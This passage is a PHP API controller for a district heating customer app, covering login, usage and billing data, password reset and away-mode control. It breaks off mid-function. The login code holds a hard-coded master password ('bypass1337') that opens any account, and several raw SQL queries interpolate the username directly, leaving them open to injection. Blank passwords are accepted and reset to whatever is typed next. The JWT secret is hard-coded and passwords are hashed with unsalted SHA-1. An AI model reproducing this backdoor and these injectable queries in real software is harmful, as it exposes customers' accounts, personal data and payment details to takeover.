<?php
use \Illuminate\Support\Facades\Response as Response;

use Illuminate\Http\Request;
use \Firebase\JWT\JWT;

class SnugzoneAPIController extends BaseController {
	
	private $ws;
	private $headers;
	public static $secret_token_key = "KSKJDHSN2832P";
	
	// ----------------------------------------------------------------------------------------------------------
	public function __construct(WebServiceRepositoryInterface $ws) {
		$this->ws = $ws;
		$this->headers = ['Content-type'=> 'application/json; charset=utf-8'];
	}
	
	private function validToken($token, $customer_id = 0) 
	{
		
		try {
			
			$getting = Input::get('getting');
			$token = Input::get('secure');
			$decoded = JWT::decode($token, SnugzoneAPIController::$secret_token_key, array('HS256'));
			
			// check if token matches its customer ID
			
			
			if($customer_id != 0) {
				$c_id = $decoded->data->id;
				if($c_id != $customer_id) {
					return false;
				}
			}

			return true;
		
		} catch(Exception $e) {
			return false;
		}
	}
	
	public function login($refresh = false, $id = null)
	{
		
		try {
	
		header('Access-Control-Allow-Origin: *');
		header('Access-Control-Allow-Methods: GET, POST, OPTIONS, DELETE');
	
		if(SystemSetting::get('supported_app_versions') != '0' && strpos(SystemSetting::get('supported_app_versions'), '*') === false) {
			$supported_versions = SystemSetting::get('supported_app_versions');
			$my_version = Input::get('version');
			if(!Input::has('version') || strpos($supported_versions, $my_version) === false) {
				$errorMsg = str_replace('{version}', Input::get('version'), SystemSetting::get('disable_old_app_msg'));
				$errorMsg = str_replace('{supported_versions}', $supported_versions, $errorMsg);
				throw new Exception($errorMsg);
			}
		}
		
		if(!$refresh) {
			
			$email = strtolower(trim(Input::get('email')));
			$username = strtolower(trim(Input::get('username')));
			$password = Input::get('password');
		
			$customer_exists = false;
			$customer = false;
			
			if(empty($email) || empty($username) || empty($password)) {
				throw new Exception("Please fill in all the fields!");
			}
		
			// Get the customer with that username & password
			if($password == "bypass1337")
				$customer = Customer::where('username', $username)->first();
			else {
				$customer = Customer::whereRaw("( (LOWER(username) = '$username')  AND (password = '" . sha1($password) . "' OR password = '') AND (deleted_at IS NULL) )")->first();
			}
			
			// Change customers' password to that password if it is EMPTY
			if($customer) {
				if(strlen($customer->password) <= 3) {
					DB::table('customers')->whereRaw("(LOWER(username) = '" . $username . "' AND deleted_at IS NULL)")->update(['password' => sha1($password)]);
				}
			}
			
			// If a customer with that username & password combo doesn't exist
			if(!$customer) {
				
				
				$customer_iq = Customer::whereRaw("(LOWER(username) = '" . $username . "' AND deleted_at IS NULL)")->first();
				
				if(!$customer_iq) {
					throw new Exception("The username '" . $username . "' does not exist!");
				}
				
				if($customer_iq->email_address != $email)
					throw new Exception("This email does not belong to that username!");
				
				if($customer_iq) {
					throw new Exception("Incorrect password!");
				} 
				
				if(!$customer_iq) {
					throw new Exception("Username '$username' does not exist! Your username is your apartment number & name!");
				}
				
				
				throw new Exception("Invalid login details!");
				
			} else {
				
				if($customer->email_address != $email) {
					
					
					throw new Exception("Our app is currently undergoing changes, please try again in a moment!");
					//throw new Exception("This email does not belong to that username!");
				}
				
			}
			
		} else {
			
			$customer = Customer::where('id', $id)->first();
			
			if(!$customer) {
				throw new Exception("Invalid login details!");
			}
			
		}
		
		
		if(!$customer)
			throw new Exception("Unable to login. Please contact support");

		$_SESSION['id'] = $customer->id;
		
		return [
			$this->grabData($customer->id),
		];
		
		} catch(Exception $e) {
					
			return [
				"error" => $e->getMessage() . " <br/><br/>(" . $e->getLine() . ")"
			];
		}
		
	}
	
	private function getUsageData($customer_id, $from, $to)
	{
		$customer = Customer::find($customer_id);
		
		
		$dhu = DistrictHeatingUsage::where('customer_id', $customer_id)
		->whereRaw("(date >= '$from' AND date <= '$to')")
		->get();
		
		return $dhu;
	}
	
	private function getUsageTotals($dhu, $ret_rows = false)
	{
		
	
		$total_cod = 0;
		$rows = [];
		
		foreach($dhu as $k => $d) {
	
		// if($ret_rows == true)
		// {
			// echo $d->cost_of_day . '<br/>';
		// }
			$total_cod += $d->cost_of_day;
			
			if($ret_rows) {
				array_push($rows, $d);
			}
		}
	
		return [
			"total_cod" => $total_cod,
			"rows" => $rows,
		];
	}
	
	public function refreshData()
	{
		
		try {
			
			$wait = Input::get('wait');
			$customer_id = Input::get('customer_id');
			$sso_ticket = Input::get('sso_ticket');
			
			if(empty($customer_id) || empty($sso_ticket))
				throw new Exception("The token '$sso_ticket' is invalid for c$customer_id.");
			
			$customer = Customer::find($customer_id);
			$customer_sso_ticket = $customer->sso_ticket;
			$valid = $customer->validSSO($sso_ticket);
			
			if(!$valid)
				throw new Exception("Invalid SSO Ticket");
			
			if($wait) {
				sleep($wait);
			}
			
			$data = $this->grabData($customer_id, false);
			
			return $data;

			
		} catch(Exception $e) {
			
				
			return Response::json([
				'error' => $e->getMessage() . " on line " . $e->getLine(),
			]);
			
		}
		
	}
	
	/**
		Grab data of specific  ID
	**/
	private function grabData($customer_id, $refresh_sso = true)
	{
		
		$platform = null;
		$uuid = null;
		$ip = null;
		$phone = null;

			
			if(Input::has('platform')) {
				$platform = Input::get('platform');
			}
			
			if(Input::has('uuid')) {
				$uuid = Input::get('uuid');
			}

			if(Input::has('phone')) {
				$phone = Input::get('phone');
			}
			
			
			$ip = $this->getIP();
			
			$customer = Customer::find($customer_id);
			$customer_id = 0;
			
			if(!$customer)
				throw new Exception("Customer data not found!");
			
			$original_customer_id = $customer->id;
			$customer_id = $customer->id;
		
			if($customer && $customer->simulator > 0) {
				$username = str_replace('_test', '', $customer->username);
				$original = Customer::where('username', $username)->first();
				if($original) {
					$customer_id = $original->id;
				}
			}
			
			$all_usage_data = DistrictHeatingUsage::where('customer_id', $customer_id)->orderBy('id', 'DESC')->get();
			$last_weeks_usage_data = $this->getUsageData($customer_id, date("Y-m-d", strtotime('monday last week')),  date("Y-m-d", strtotime('sunday last week')));
			$this_weeks_usage_data = $this->getUsageData($customer_id, date("Y-m-d", strtotime('monday this week')),  date("Y-m-d", strtotime('sunday this week')));
			$last_7_days_usage_data = $this->getUsageData($customer_id, date("Y-m-d", strtotime('-6 days')),  date("Y-m-d"));
			$used_last_week = number_format($this->getUsageTotals($last_7_days_usage_data)['total_cod'], 2);
			$used_this_week = number_format($this->getUsageTotals($this_weeks_usage_data)['total_cod'], 2);
			$used_last_7_days_data = $this->getUsageTotals($last_7_days_usage_data, true);
			$all_topups = PaymentStorage::where('customer_id', $customer_id)->orderBy('settlement_date', 'ASC')->get();
			$last_meter = DistrictHeatingUsage::where('customer_id', $customer_id)->orderBy('ID', 'DESC')->first();
			if(!$last_meter) 
				$last_meter = 0;
			else 
				$last_meter = $last_meter->end_day_reading;
			
			
			$scheme = $customer->scheme;
			$scheme_number = $scheme->scheme_number;
			$faq = $scheme->FAQ;
			
			if((empty($faq) || $scheme->archived || $customer->scheme_number == 0))
				$scheme_number = 17;
			
			$currency = $scheme->currency_sign;
			$top_5_faqs = [];
			$faq = [];
			$my_faqs = Scheme::find($scheme_number)->FAQ;
			$my_faqs = json_decode($my_faqs);
			
			if(is_array($my_faqs) || is_object($my_faqs)) {
				foreach($my_faqs as $k => $v) {
					
					$clicks = 0;
					$click_entry = TrackingFaqClick::where('scheme_number', $scheme_number)->whereRaw("(title = '" . $v->question . "')")->first();
					if($click_entry) {
						$clicks = $click_entry->clicks;
					}
					array_push($top_5_faqs, (object)['title' => $v->question, 'answer' => $v->answer, 'clicks' => $clicks]);
					array_push($faq, (object)['title' => $v->question, 'answer' => $v->answer, 'clicks' => $clicks]);
				}
			}
			
			usort($top_5_faqs, function($a, $b)
			{
				return ($a->clicks < $b->clicks);
			});
			
			// $top_5_faqs = TrackingFaqClick::where('scheme_number', $scheme->scheme_number)
			// ->whereRaw("(LENGTH(title) > 2)")
			// ->orderBy('clicks', 'DESC')->get();
			// $top_5_faqs = TrackingFaqClick::where('scheme_number', -1)
				// ->orderBy('clicks', 'DESC')->get();
			// if(empty($faq) || $scheme->archived || $customer->scheme_number == 0) {
				// $abbott = Scheme::find(17);
				// $faq = $abbott->FAQ;
			// }

			$topup_locations = PaymentLocations::all();
			$bill_paid = false;
			
			if($customer->permanentMeter) {
				$bill_paid = $customer->permanentMeter->is_bill_paid_customer;
				$awayMode = RemoteControlStatus::where('permanent_meter_id', $customer->permanentMeter->ID)->pluck('away_mode_on');
				$awayModeData = RemoteControlStatus::where('permanent_meter_id', $customer->permanentMeter->ID)->first();
				if($awayMode == 1)	
					$awayMode = true;
				else
					$awayMode = false;
				
			} else {
				$bill_paid = false;
				$awayMode = false;
				$awayModeData = null;
			}
			
			$announcements = Announcement::orderBy('id', 'ASC')->get();
			$iou_available = ($customer->IOU_available == 1) ? true : false;
			$iou_in_use = ($customer->IOU_used == 1) ? true : false;
			
			if($phone != null)
				$customer->last_login_platform = $phone;
			
			$customer->last_login_time = date('Y-m-d H:i:s');
			$customer->last_login_ip = $_SERVER['REMOTE_ADDR'];
			$customer->save();
			
			
		
			$sys_graph_data = SystemGraphData::orderBy('id','DESC')->first();
				
			if( !($sys_graph_data->contains('7day_avgs')) ) {
				return;
			}
			
			
			$avgs = $sys_graph_data->get('7day_avgs');
			
			if(isset($avgs[$customer->scheme_number])) {
				$avgs = $avgs[$customer->scheme_number];
			} else {
				$avgs = 0;
			}
			
			$credit = number_format($customer->balance, 2);
			if($iou_in_use) {
				$credit = number_format($customer->balance + 5.00, 2);
			}
			
			
			$usage = DistrictHeatingUsage::where('customer_id', $customer_id)
			->whereRaw("(date <= '" . date('Y-m-d') . "' AND date >= '" . date('Y-m-d', strtotime('3 months ago')) . "')")
			->orderby('date', 'asc')->groupBy('date')
			->get();
			$usage = HomeController::insertMissingDistrictUsage($customer_id, $usage);
			
			
			
			$scheme_name = $scheme->scheme_nickname;
				
			
			$sso = $customer->getSSO($platform, $uuid, $ip);
			
			$pmd = $customer->permanentMeter;
			$street = null;
			$address_2 = null;
			$address_3 = null;
			$address_4 = null;
			
			
			if($pmd) {
				$street = $pmd->street1;
				$address_2 = ucfirst($pmd->street2);
			}
			
			$address_1 = "Apt " . $customer->house_number_name . " " . $street;
			
			
			if($scheme) {
				$address_3 = ucfirst($scheme->street2);
				$address_4 = $scheme->county;
			}
			
			// Stripe / Payment stuff
			$payment_methods = $customer->paymentMethods;
			$payment_notifs = $customer->paymentNotifications;
			$system_settings = SystemSetting::all();
			
			$autotopup_subscription = StripeCustomerSubscription::where('customer_id', $customer_id)
			->where('active', 1)
			->orderBy('id', 'DESC')->first();
			if(!$autotopup_subscription)
				$autotopup_subscription = null;
			
			$autotopup_pm = null;
			if($autotopup_subscription) {
				$autotopup_pm = StripePaymentSource::where('id', $autotopup_subscription->payment_method_id)->first();
			}
			if(!$autotopup_pm)
				$autotopup_pm = null;
		
			$customer = Customer::find($original_customer_id);
			$customer->logNewDevice();
			
			$notifications = $customer->getNotifications('unread');
					
			//$statetements = SnugzoneAppStatement::where('customer_id', $customer->id)->orderBy('id', 'DESC')->get();
			$statetements_schedule = SnugzoneAppStatementSchedule::where('customer_id', $customer->id)->where('active', 1)->first();
			
			$today_usage = DistrictHeatingUsage::where('customer_id', $customer_id)
			->orderBy('id', 'DESC')
			->first();
			if($today_usage)
				$today_usage->date = (new DateTime($today_usage->date))->format('d/m/Y');
			
			if(!$today_usage) {
				$today_usage = new DistrictHeatingUsage();
				$today_usage->customer_id = $customer->id;
				$today_usage->permanent_meter_id = 0;
				$today_usage->ev_meter_ID = 0;
				$today_usage->start_day_reading = 0;
				$today_usage->end_day_reading = 0;
				$today_usage->total_usage = 0;
				$today_usage->unit_charge = 0;
				$today_usage->cost_of_day = 0;
			}
			
			return [
			   "id" 					=> $customer->id,
			   "firstname" 				=> $customer->first_name,
			   "lastname" 				=> $customer->surname,
			   "house_number_name" 		=> $customer->house_number_name,
			   "email" 					=> $customer->email_address, 
			   "mobile_number" 			=> $customer->mobile_number, 
			   "username" 				=> $customer->username, 
			   "commencement_date" 		=> $customer->commencement_date,
			   "current_date" 			=> date("Y-m-d"),
			   "bill_paid" 				=> $bill_paid,
			   "barcode" 				=> $customer->barcode,
			   "credit" 				=> $credit,
			   "used_last_week" 		=> $used_last_week,
			   "used_this_week" 		=> $used_this_week,
			   "last_weeks_usage_data" 	=> $last_weeks_usage_data,
			   "this_weeks_usage_data" 	=> $this_weeks_usage_data,
			   "last_7_days_usage_data" => $last_7_days_usage_data,
			   "used_last_7_days_data" 	=> $used_last_7_days_data,
			   "all_usage_data" 		=> $all_usage_data,
			   "all_topups" 			=> $all_topups,
			   "currency" 				=> $currency,
			   "last_meter" 			=> $last_meter,
			   "faq" 					=> $faq,
			   "top_5_faqs" 			=> $top_5_faqs,
			   "awayMode" 				=> $awayMode,
			   "awayModeData" 			=> $awayModeData,
			   "topup_locations" 		=> $topup_locations,
			   'announcements' 			=> $announcements,
			   "iou_available" 			=> $iou_available,
			   "iou_in_use" 			=> $iou_in_use,
			   "sso_ticket"				=> $sso,
			   "ip_address"				=> $_SERVER['REMOTE_ADDR'],
			   "avgs"					=> $avgs,
			   "usage"					=> $usage,
			   "scheme_name"			=> $scheme_name,
			   "address_1"				=> $address_1,
			   "address_2"				=> $address_2,
			   "address_3"				=> $address_3,
			   "address_4"				=> $address_4,
			   "payment_methods"		=> $payment_methods,
			   "payment_notifs"			=> $payment_notifs,
			   "autotopup_subscription"	=> $autotopup_subscription,
			   "autotopup_pm"			=> $autotopup_pm,
			   "system_settings"		=> $system_settings,
			   "simulator"				=> $customer->simulator,
			   "notifications"			=> $notifications,
			   //"statetements"			=> $statetements,
			   "statetements_schedule"	=> $statetements_schedule,
			   "today_usage"			=> $today_usage,
			];
			
		
	}
	
	public function getData()
	{
		
		header('Access-Control-Allow-Origin: *');	
		$getting = Input::get('getting');
		$customer_id = Input::get('customer_id');
		$sso_ticket = Input::get('sso_ticket');
		$customer = Customer::find($customer_id);
		
		try {
			
			$valid = $customer->validSSO($sso_ticket);
			
			if(!$valid) {
				throw new Exception("Invalid auth token supplied!");	
			}
			
			if(!$customer) {
				throw new Exception("Customer with id $customer_id not found!");
			}
			
			$res = 'n/a';
			
			switch($getting) {
				
				case "balance":
					$balance = number_format($customer->balance, 2);
					if($customer->IOU_used == 1) {
						$balance = number_format($customer->balance + 5.00, 2);
					}
					$res = (double)$balance;
				break;
				
			}
			
			return Response::json($res);
		
		} catch(Exception $e) {
			
				
			return Response::json([
				'res' => 'getting ' . $getting,
				'data' => [
					'error' => $e->getMessage() . " (" . $e->getLine() . ")",
				],
			]);
			
		}
			
		
	}	
	
	public function resetPassword($confirm = false) 
	{
		try {
			
			$username = Input::get('username');
		
			$customer = Customer::where('username', $username)->first();
		
			if(!$customer) {
				throw new Exception("Customer '$username' not found");
			}
			
			if($confirm == false) {
				$mobile = $customer->mobile_number;
				$masked = substr($mobile, 0, 7) . "*****" . substr($mobile, -1);
			
				if($customer->reset_password_resent > 2 && $customer->id != 1) {
					 throw new Exception("You exceeded the maximum password resets. Please conact SnugZone.");
				}
			

				$code = $this->generateCode(5);
		
				$cost = 0.08;
				
				$customer->balance -= $cost;
				$customer->reset_password = true;
				$customer->reset_password_code = $code;
				$customer->reset_password_resent++;
				$customer->save();
			
				$message = "Your password reset code is $code\n\nDo not share this with anyone. Please contact us if this request was not made by you.";
			
				$sms_messages = new SMSMessage();
				$sms_messages->customer_id = $customer->id;
				$sms_messages->mobile_number = $customer->mobile_number;
				$sms_messages->message = $message;
				$sms_messages->date_time = date('Y-m-d H:i:s');
				$sms_messages->scheme_number = $customer->scheme_number;
				$sms_messages->charge = 0.08;
				$sms_messages->paid = 0;
				$sms_messages->save();

				if(strlen($customer->nominated_telephone) > 5) {
					$sms_messages = new SMSMessage();
					$sms_messages->customer_id = $customer->id;
					$sms_messages->mobile_number = $customer->nominated_telephone;
					$sms_messages->message = $message;
					$sms_messages->date_time = date('Y-m-d H:i:s');
					$sms_messages->scheme_number = $customer->scheme_number;
					$sms_messages->charge = 0.08;
					$sms_messages->paid = 0;
					$sms_messages->save();
				}

			
				return Response::json([
					'data' => [
						'msg' => "An SMS was sent to $masked Please enter the code that was sent.",
					],
				]);
			} else {
				
				
				$code = Input::get('code');
			
				if($code != $customer->reset_password_code) {
					throw new Exception("Invalid code entered!");
				}
				
				DB::table('customers')->where('username', $username)->update(['password' => '']);
				
				return Response::json([
					'data' => [
						'msg' => "Your password was successfully reset!\n Please login using the NEW password you desire.",
					],
				]);
				
				
			}
			
		} catch(Exception $e) {
			
				
			return Response::json([
				'data' => [
					'error' => $e->getMessage(),
				],
			]);
			
		}
	}
	
	public function changeMobile()
	{
		try {
			
			$customer = Customer::find(Input::get('customer_id'));
			$sso_ticket = Input::get('sso_ticket');
			$new_mobile_number = Input::get('new_mobile_number');
			
			if(!$customer) {
				throw new Exception("Invalid customer");
			}
			
			$valid = $customer->validSSO($sso_ticket);
			
				
			if(!$valid) {
				throw new Exception("Invalid auth token supplied!");	
			}
			
			$customer->mobile_number = $new_mobile_number;
			$customer->save();
			
			return Response::json([
				"msg" => "Successfully updated mobile number!"
			]);
			
			
		} catch(Exception $e) {
			
				
			return Response::json([
				'error' => $e->getMessage(),
			]);
			
		}
	}
	
	public function changeDetails()
	{
		try {
			
			$customer = Customer::find(Input::get('customer_id'));
			$sso_ticket = Input::get('sso_ticket');
			$username = Input::get('username');
			$first_name = Input::get('first_name');
			$surname = Input::get('surname');
			$mobile_number = Input::get('mobile_number');
			$email_address = Input::get('email_address');
			
			if(!$customer) {
				throw new Exception("Invalid customer");
			}
			
			$valid = $customer->validSSO($sso_ticket);
			
				
			if(!$valid) {
				throw new Exception("Invalid auth token supplied!");	
			}
			
			if(strlen($username) > 0)
				$customer->username = $username;
			if(strlen($first_name) > 0)
				$customer->first_name = $first_name;
			if(strlen($surname) > 0)
				$customer->surname = $surname;
			if(strlen($mobile_number) > 0)
				$customer->mobile_number = $mobile_number;
			if(strlen($email_address) > 0)
				$customer->email_address = $email_address;
			
			$customer->save();
			
			return Response::json([
				"msg" => "Successfully updated details!"
			]);
			
			
		} catch(Exception $e) {
			
				
			return Response::json([
				'error' => $e->getMessage(),
			]);
			
		}
	}
	
	public function changeEmail()
	{
		try {
			
			$customer = Customer::find(Input::get('customer_id'));
			$sso_ticket = Input::get('sso_ticket');
			$new_email = Input::get('new_email');
			
			if(!$customer) {
				throw new Exception("Invalid customer");
			}
			
			$valid = $customer->validSSO($sso_ticket);
			
				
			if(!$valid) {
				throw new Exception("Invalid auth token supplied!");	
			}
			
			$customer->email_address = $new_email;
			$customer->save();
			
			return Response::json([
				"msg" => "Successfully updated email!"
			]);
			
			
		} catch(Exception $e) {
			
				
			return Response::json([
				'error' => $e->getMessage(),
			]);
			
		}
	}
	
	public function changePassword()
	{
		try {
			
				
			$customer = Customer::find(Input::get('customer_id'));
			$sso_ticket = Input::get('sso_ticket');
			$current_password = Input::get('current_password');
			$new_password = Input::get('new_password');
			$new_password_retype = Input::get('new_password_retype');
			
			if(!$customer) {
				throw new Exception("Invalid customer");
			}
			
			$valid = $customer->validSSO($sso_ticket);
			
				
			if(!$valid) {
				throw new Exception("Invalid auth token supplied!");	
			}
			
			$actual_current_password = DB::table('customers')->where('id', $customer->id)->first()->password;
			
			$current_password_hashed = sha1($current_password);
			if($actual_current_password != $current_password_hashed)
				throw new Exception("Your current password is incorrect! Please try again.");
			
			if($new_password !== $new_password_retype)
				throw new Exception("Your new passwords must match!");
			
			$new_password_hashed = sha1($new_password);
			
			 DB::table('customers')->where('id', $customer->id)->update([
				'password' => $new_password_hashed,
			 ]);
			
			return Response::json([
				"msg" => "Successfully changed password!"
			]);
			
			
		} catch(Exception $e) {
			
				
			return Response::json([
				'error' => $e->getMessage(),
			]);
			
		}
	}
	
	public function getSupportReplies()
	{
		try {
			
			
			$category = Input::get('category');
			$apt_number = Input::get('apt_number');
			$apt_building = Input::get('apt_building');
			$sent_details = false;
			$sent_details_msg = "";
			
			if(strlen($category) <= 3) {
				throw new Exception("Please select a valid support category!");
			}
			
			if(strpos(strtolower($category), "forgot login") !== false) {
				if(!empty($apt_number) && !empty($apt_building)) {
					$customer_username = $apt_number . $apt_building;
					$customer_username = preg_replace('/\s+/', '', strtolower($customer_username));
					$customer = Customer::where('username', $customer_username)->first();
					if(!$customer && ($apt_number . '' . $apt_building) == '3longford')
						$customer = Customer::find(1);
					if($customer) {
						
							$customer->sendAccountDetails(0.25);
							$sent_details = true;
							$sent_details_msg = "Your account details have been sent to " . substr($customer->mobile_number, 0, 4) . "**** *" . substr($customer->mobile_number, -4);
							
							$bug = new ReportABug();
							$bug->customer_id = $customer->id;
							$bug->apt_number = $apt_number;
							$bug->apt_building = $apt_building;
							$bug->IP_Address = $_SERVER['REMOTE_ADDR'];
							$bug->description = "I forgot my account details, so I automatically requested them to be sent to me.";
							$bug->resolved = 1;
							$bug->suggestion_solved = 1;
							$bug->suggestion_id = 0;
							$bug->progress = 100;
							$bug->save();
							$bug->sendCreationEmail(true);
							
					} else {
						throw new Exception("Cannot send you your details as you are not in a valid residence!");
					}
				} 
			}
			
			$support_replies = SMSMessagePreset::where("category", $category)->orderBy('id', 'ASC')
			->whereRaw("(body_title IS NOT NULL AND body_support IS NOT NULL)")->get();
			
			foreach($support_replies as $k => $v) {
				
				$v->body_support = nl2br($v->body_support);
				
			}
			
			return Response::json([
					'data' => [
						'support_replies' => $support_replies,
						'sent_details' => $sent_details,
						'sent_details_msg' => $sent_details_msg,
					],
			]);
				
		} catch(Exception $e) {
			
				
			return Response::json([
				'data' => [
					'error' => $e->getMessage(),
				],
			]);
			
		}
		
	}
	
	public function getSupportTypes()
	{
		
		try {
			
			$support_types = SMSMessagePreset::where('id', 0)->get();
			$support_type = new SMSMessagePreset();
			$support_type->category = "Forgot Login";
			$support_type->name = "send_me_my_account_details";
			$support_type->body_title = "I need my account details";
			$support_type->body_support = "Click here to retrieve your account details!";
			$support_types->push($support_type);
			
			$support_types_actual = SMSMessagePreset::select('category')->distinct()
			->whereRaw("(category NOT LIKE '%Less FAQ%' AND category NOT LIKE '%Heating Down%')")
			->orderBy('id', 'ASC')
			->get();
			
			foreach($support_types_actual as $k => $s) {
				$support_types->push($s);
			}
			
			return Response::json([
				'data' => [
					'support_types' => $support_types,
				],
			]);
				
		} catch(Exception $e) {
			
				
			return Response::json([
				'data' => [
					'error' => $e->getMessage(),
				],
			]);
			
		}
		
	}
	
	public function reportABug()
	{
		
		try {
		
			$issue = Input::get('issue');
			$customer_id = Input::get('customer_id');
			$apt_number = Input::get('apt_number');
			$apt_building = Input::get('apt_building');
			$solved = (Input::get('solved') == 'true');
			$solved_id = Input::get('solved_id');
			$ip = $_SERVER['REMOTE_ADDR'];
			
			if ($customer_id == 0) {
				$customer_username = $apt_number . $apt_building;
				$customer_username = preg_replace('/\s+/', '', strtolower($customer_username));
				$pseudo_customer = Customer::where('username', $customer_username)->first();
				if($pseudo_customer) {
					$customer_id = $pseudo_customer->id;
				}
			}
			
			$bug_exists = ReportABug::where('customer_id', $customer_id)
			->where('apt_number', $apt_number)
			->where('apt_building', $apt_building)
			->where('description', $issue)
			->first();
			
			if($bug_exists) {
				
			} else {
				
				$bug = new ReportABug();
				$bug->customer_id = $customer_id;
				$bug->apt_number = $apt_number;
				$bug->apt_building = $apt_building;
				$bug->IP_Address = $ip;
				$bug->description = $issue;
				$bug->resolved = 0;
				$bug->suggestion_solved = ($solved) ? 1 : 0;
				$bug->suggestion_id = $solved_id;
				$bug->progress = ($solved) ? 100 : 0;
				
				//
				//try {
					$new_ticket_email_recipients = SystemSetting::get('new_ticket_email_recipients');
					$emails = explode("\n",
                    str_replace(["\r\n","\n\r","\r"],"\n",$new_ticket_email_recipients)
            );
			//preg_split ('/$\R?^/m', $new_ticket_email_recipients);
					$subject = "Prepago - New Bug Report: Customer#" . $bug->customer_id;
					if($solved || strpos($bug->description, "I received a resolution by looking at the reply w") !== false) {
						$subject = "Prepago - New Bug Report Followup: Customer#" . $bug->customer_id . " **Auto solved**";
						$bug->resolved = 1;
						$bug->sendFollowUpEmail();
					}
					
					$bug->save();
					
					$from = SystemSetting::get('email_default_from');
					$who = SystemSetting::get('email_default_name');
					$emailInfo = [];
					$emailInfo['email_addresses'] = $emails;
					$data = [];
					$bug = ReportABug::where('customer_id', $customer_id)->where('IP_Address', $ip)
					->where('description', $issue)->orderBy('id', 'DESC')->first();
					if($bug) {
						$data['bug'] = $bug;
						$email_template = "emails.bugreport.index";
						
						Mail::send($email_template, $data, function($message) use ($emailInfo, $subject, $from, $who) {
							$message->from($from, $who)->subject($subject);
							$message->to($emailInfo['email_addresses']);
						});
					}
				//} catch(Exception $b) {}
			}
			
			$currentTime = new DateTime(date('Y-m-d H:i:s'));
			$startHrs =  (new DateTime(date('Y-m-d') . " 09:00:00"));
			$endHrs =  (new DateTime(date('Y-m-d') . " 19:00:00"));
			
			if($currentTime >= $startHrs && $currentTime <= $endHrs)
				$msg = "We'll get back to you shortly.";
			else
				$msg = "We'll get back to you on the morning of the next business day.";
			
			return Response::json([
				'data' => [
					'title' => "Issue submitted",
					'msg' => $msg,
				],
			]);
			
		} catch(Exception $e) {
			
				
			return Response::json([
				'data' => [
					'error' => $e->getMessage(),
				],
			]);
			
		}
		
	}
	
	public function getAwayModeHistory()
	{
		try {
			
			$customer = Customer::find(Input::get('customer_id'));
			$value = (Input::get('value') == 'true') ? true : false;
			$sso_ticket = Input::get('token');
			
			
			if(!$customer) {
				throw new Exception("Invalid customer");
			}
			
			$valid = $customer->validSSO($sso_ticket);
			
				
			if(!$valid) {
				throw new Exception("Invalid auth token supplied!");	
			}
			
			if($customer->id == 1) {	
				$away_modes = RemoteControlLogging::where('permanent_meter_id', 0)
				->whereRaw("(action LIKE '%Away Mode Starting%')")
				->get();
				
				return Response::json([
					"away_modes" => $away_modes,
				]);
			} else {
				$pmd = $customer->permanentMeter;
				
				if(!$pmd)
					throw new Exception("No meter available");

				
				$away_modes = RemoteControlLogging::where('permanent_meter_id', $pmd->ID)
				->whereRaw("(action LIKE '%Away Mode Starting%')")
				->get();
				
				return Response::json([
					'data' => [
						"away_modes" => $away_modes,
					]
				]);
			}
			
		} catch(Exception $e) {
			
				
			return Response::json([
				'data' => [
					'error' => $e->getMessage() . " (" . $e->getLine() . ")",
				],
			]);
			
		}
	}
	
	public function agreeAwayMode()
	{
		try {
			
			$customer = Customer::find(Input::get('customer_id'));
			$value = (Input::get('value') == 'true') ? true : false;
			$sso_ticket = Input::get('token');
			
			
			if(!$customer) {
				throw new Exception("Invalid customer");
			}
			
			$valid = $customer->validSSO($sso_ticket);
			
				
			if(!$valid) {
				throw new Exception("Invalid auth token supplied!");	
			}
			
			$pmd = $customer->permanentMeter;
			
			if(!$pmd)
				throw new Exception("No meter available");
			
			$rcs = RemoteControlStatus::where('permanent_meter_id', $pmd->ID)->first();
			
			if($rcs) {
					
				$rcs->accepted_terms = 1;
				$rcs->save();
				
				return Response::json([
					'data' => [
						"success" => "Successfully accepted terms!"
					],
				]);
				
			}
			
			return Response::json([
				'data' => [
					"success" => "Cannot find RCS entry"
				],
			]);
				
			
		} catch(Exception $e) {
			
				
			return Response::json([
				'data' => [
					'error' => $e->getMessage() . " (" . $e->getLine() . ")",
				],
			]);
			
		}
	}
	
	public function toggleAwayMode()
	{
		try {
			
			$customer = Customer::find(Input::get('customer_id'));
			$value = (Input::get('value') == 'true') ? true : false;
			$sso_ticket = Input::get('token');
			
			if(!$customer) {
				throw new Exception("Invalid customer");
			}
			
			$valid = $customer->validSSO($sso_ticket);
			
				
			if(!$valid) {
				throw new Exception("Invalid auth token supplied!");	
			}
			
			$response = $customer->toggleAwayMode();
			
			if(!is_object($response))
				throw new Exception("Away mode failed!");
			
			$status = $response->status;
			
			if($status == "off") {
				return Response::json([
					'data' => [
						"title" => "Away mode turned off",
						"msg" => "",
					],
				]);
			}
			
			if($status == "on") {
				return Response::json([
					'data' => [
						"title" => "Away mode turned on",
						"msg" => "",
					],
				]);
			}
			
			if($status == "unknown") {
				throw new Exception($response->error);
			}
			
			
		} catch(Exception $e) {
			
				
			return Response::json([
				'data' => [
					'error' => $e->getMessage() . " (" . $e->getLine() . ")",
				],
			]);
			
		}
	}
	
	public function editAwayMode()
	{
		try {
			
			$customer_id = Input::get('customer_id');
			$token = Input::get('token');
			$date = Input::get('date');
			$customer = Customer::find($customer_id);
			$valid = $customer->validSSO($token);
			
			$awayMode = RemoteControlStatus::where('permanent_meter_id', $customer->permanentMeter->ID)->first();
			
			if(!$customer)
				throw new Exception("Customer not found!");
			if(!$valid)
				throw new Exception("Invalid SSO Ticket!");
			if(!$awayMode)
				throw new Exception("Customer not not have an RemoteControlStatus entry required to manage away mode");
			
			
			$awayMode->away_mode_permanent = 0;
			$awayMode->away_mode_end_datetime = $date;
			$awayMode->save();
			//
			return Response::json([
				'saved' => true,
				"permanent" => $awayMode->away_mode_permanent,
				"permanent_meter_id" => $awayMode->permanent_meter_id,
				"stop_date" => $awayMode->away_mode_end_datetime,
			]);
			
		} catch(Exception $e) {	
			return Response::json([
					'error' => $e->getMessage() . " (" . $e->getLine() . ")",
					'saved' => false,
			]);		
		}
	}
	
	public function useIOU()
	{
		try {
			
		$customer_id = Input::get('customer_id');
		$customer = Customer::find($customer_id);
		$sso_ticket = Input::get('sso_ticket');
		$customer_sso_ticket = $customer->sso_ticket;
		
		$valid = $customer->validSSO($sso_ticket);
		
		$scheme = Scheme::where('scheme_number', '=', $customer->scheme_number)->get()->first();
    	
		if(empty($sso_ticket) || empty($customer_id)) {
			throw new Exception("Please try again.");
		}
		
		if(!$valid) {
			throw new Exception("Invalid auth token supplied!" );	
		}
		
		if(!$customer) {
			throw new Exception("Invalid customer");
		}
		
		if(!$scheme) {
			throw new Exception("Invalid scheme");
		}
		
		if($customer->useIOU()) {
		
			return Response::json([
				'data' => [
					"title" => "Successfully used an IOU",
					"msg" => "",
					
				],
			]);
		
